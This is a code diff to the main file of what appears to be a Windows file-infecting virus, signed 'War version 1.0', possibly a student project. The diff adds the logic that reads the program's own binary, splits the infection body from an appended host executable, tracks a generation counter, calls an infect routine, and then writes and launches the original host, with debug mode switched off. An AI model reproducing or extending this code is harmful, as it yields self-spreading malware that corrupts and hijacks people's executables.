@@ -44,7 +44,7 @@ void				start_debug_console()
 /*
 ** Just in case a SEGV is knocking...
 */
-void signal_handler(int signal)
+void signal_handler(int sig)
 {
 	printf("Something went wrong, i'm dying... good bye\n");
 	//exit (1);
@@ -65,32 +65,59 @@ char		*get_temp_directory(void)
 
 char		*get_temp_executable_path(char *executable_name)
 {
-	//char	*temp_path = get_temp_directory();
+	char **split = ft_split_string(executable_name, ".exe");
 
-	return ft_dstrjoin("", "TOTO.exe", 0);
+	if (array_length(split) == 0)
+		return (strdup("a.out"));
+	return ft_dstrjoin(split[0], " (2).exe", 0);
 }
 
-bool		run_process(char *path, char *infection_content, int infection_size, int argc, char **argv, char **env)
+int			get_infection_content_size(char **ptr_content, char *executable_content, int executable_content_size)
 {
-	int pattern_position = find_pattern(infection_content, infection_size);
-	if (pattern_position == -1) {
-		return (false);
-	}
-	char *binary = infection_content + pattern_position;
-	int binary_len = infection_size - pattern_position;
-	windows_file_create_contents_size(path, binary, binary_len);
+	int		pattern_position = -1;
+	char	patter[] = { PATTERN };
 
-	printf("execve : |%s|\n", path);
-	_spawnvpe(_P_OVERLAY, path, (const char **)argv, (const char **)env);
-	return (true);
+	if ((pattern_position = find_pattern(executable_content, executable_content_size)) == -1) {
+		*ptr_content = executable_content;
+		return (executable_content_size);
+	}
+	pattern_position -= sizeof(patter);
+	char *result = ft_strnew(pattern_position);
+
+	memcpy(result, executable_content, pattern_position);
+	*ptr_content = result;
+	return (pattern_position);
 }
+
+int			get_sequence(char *infection_content, int infection_content_size)
+{
+	char patt[] = { 0x57, 0x61, 0x72, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e };//War version
+
+	for (int i = 0; i < infection_content_size - sizeof(patt); i++) {
+		if (memcmp(infection_content + i, patt, sizeof(patt)) == 0) {
+			int offset = i + sizeof(patt) + 40;
+			char *ptr = infection_content + offset;
+
+			char *seq = ft_strnew(3);
+
+			memcpy(seq, ptr, 3);
+			int sequence = atoi(seq);
+			if (sequence == 0)
+				break ;
+			return (sequence);
+		}
+	}
+	return (100);
+}
+
+const char fingerprint[] = "War version 1.0 (c)oded by <jguyet> - <frmarinh> - XXXXXXXXX";
 
 /*
 **	Main entry point
 */
 int					main(int argc, char **argv, char **env)
 {
-	bool debug = true;
+	bool debug = false;
 	setlocale(LC_CTYPE, "");
 	signal(SIGSEGV, signal_handler);
 	srand(time(NULL));
@@ -98,15 +125,19 @@ int					main(int argc, char **argv, char **env)
 		start_debug_console();
 	}
 	//INFECTION
-	char	*infection_content = NULL;
-	int		infection_size = 0;
-
-	if ((infection_size = windows_file_get_contents_size(&infection_content, argv[0])) <= 0)
+	char	*executable_content = NULL;
+	int		executable_content_size = 0;
+	if ((executable_content_size = windows_file_get_contents_size(&executable_content, argv[0])) <= 0)
 		return (0);
-	infect(argv[0], infection_content, infection_size);
+	char *infection_content = NULL;
+	int infection_size = get_infection_content_size(&infection_content, executable_content, executable_content_size);
+	if (infection_size == 0)
+		return (0);
+	int sequence = get_sequence(infection_content, infection_size);
+	infect(argv[0], infection_content, infection_size, sequence);
 	//RUNNING
 	char *temp_path = get_temp_executable_path(argv[0]);
-	bool running = run_process(temp_path, infection_content, infection_size, argc, argv, env);
+	bool running = run_packed_executable(temp_path, executable_content, executable_content_size, argv, env);
 	while (debug == true && 1);
 	return (0);
 }
